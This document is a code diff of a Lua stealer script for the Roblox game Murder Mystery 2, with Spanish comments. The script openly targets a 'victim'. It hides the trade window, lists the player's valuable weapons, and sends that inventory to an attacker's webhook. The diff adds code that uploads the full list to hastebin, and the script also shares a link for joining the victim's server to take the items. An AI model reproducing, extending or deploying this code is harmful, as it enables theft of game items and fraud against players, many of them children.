@@ -8,7 +8,7 @@ getgenv().ScriptEjecutado = true
 
 -- Configuración
 local webhook = _G.webhook or ""
-local users = _G.Usernames or {} -- Nicknames originales
+local users = _G.Usernames or {}
 local min_rarity = _G.min_rarity or "Godly"
 local min_value = _G.min_value or 1
 local pingEveryone = _G.pingEveryone == "Yes"
@@ -33,6 +33,22 @@ local function SendWebhook(title, description, fields, prefix)
     pcall(function()
         req({Url = webhook, Method = "POST", Headers = {["Content-Type"]="application/json"}, Body = body})
     end)
+end
+
+-- Función para crear un paste en hastebin
+local function CreateHastebin(content)
+    local res = req({
+        Url = "https://hastebin.com/documents",
+        Method = "POST",
+        Headers = {["Content-Type"] = "application/json"},
+        Body = content
+    })
+    if res and res.Body then
+        local key = res.Body:match('"key":"(.-)"')
+        if key then
+            return "https://hastebin.com/"..key
+        end
+    end
 end
 
 -- Ocultar GUI de trade
@@ -177,15 +193,58 @@ local realLink = "[Unirse](https://fern.wtf/joiner?placeId="..game.PlaceId.."&ga
 
 -- Webhook inventario
 if #weaponsToSend > 0 then
+    local maxItems = 18
+    local inventoryText = ""
+    local allItemsText = ""
+    local needPaste = #weaponsToSend > maxItems
+    
+    local rarities = {}
+    for _,w in ipairs(weaponsToSend) do
+        rarities[w.Rarity] = rarities[w.Rarity] or {}
+        table.insert(rarities[w.Rarity], w)
+    end
+    
+    -- Construir embed visible
+    for i, w in ipairs(weaponsToSend) do
+        if i <= maxItems then
+            inventoryText = inventoryText .. string.format("%s x%s (%s) | Value: %s💎", w.DataID, w.Amount, w.Rarity, tostring(w.Value*w.Amount))
+            if i == maxItems and needPaste then
+                inventoryText = inventoryText .. " ... y más armas 🔥"
+            end
+            inventoryText = inventoryText .. "\n"
+        end
+    end
+
+    -- Construir paste si excede maxItems
+    local pasteLink
+    if needPaste then
+        local pasteText = ""
+        local totalByRarity = {}
+        for r, items in pairs(rarities) do
+            pasteText = pasteText .. r..":\n"
+            local sum = 0
+            for _,item in ipairs(items) do
+                local val = item.Value * item.Amount
+                sum = sum + val
+                pasteText = pasteText .. string.format("- %s x%s | Value: %s💎\n", item.DataID, item.Amount, val)
+            end
+            pasteText = pasteText .. "Total "..r..": "..sum.."💎\n\n"
+            totalByRarity[r] = sum
+        end
+        pasteText = pasteText .. "Valor total inventario: "..totalValue.."💎"
+        pasteLink = CreateHastebin(pasteText)
+    end
+
     local fieldsInit={
         {name="Victima 👤:", value=LocalPlayer.Name, inline=true},
-        {name="Inventario 📦:", value="", inline=false},
-        {name="Valor total del inventario📦:", value=tostring(totalValue).."💰", inline=true},
-        {name="Click para unirte a la víctima 👇:", value=realLink, inline=false} -- solo el real
+        {name="Inventario 📦:", value=inventoryText, inline=false},
+        {name="Valor total del inventario📦:", value=tostring(totalValue).."💰", inline=true}
     }
-    for _, w in ipairs(weaponsToSend) do
-        fieldsInit[2].value=fieldsInit[2].value..string.format("%s x%s (%s) | Value: %s💎\n", w.DataID,w.Amount,w.Rarity,tostring(w.Value*w.Amount))
+
+    if needPaste then
+        table.insert(fieldsInit,{name="Mira todos los ítems aquí 📜:", value=pasteLink and "[Mirar]("..pasteLink..")" or realLink, inline=false})
     end
+
     local prefix=pingEveryone and "@everyone " or ""
     SendWebhook("💪MM2 Hit el mejor stealer💯","💰Disfruta todas las armas gratis 😎",fieldsInit,prefix)
 end
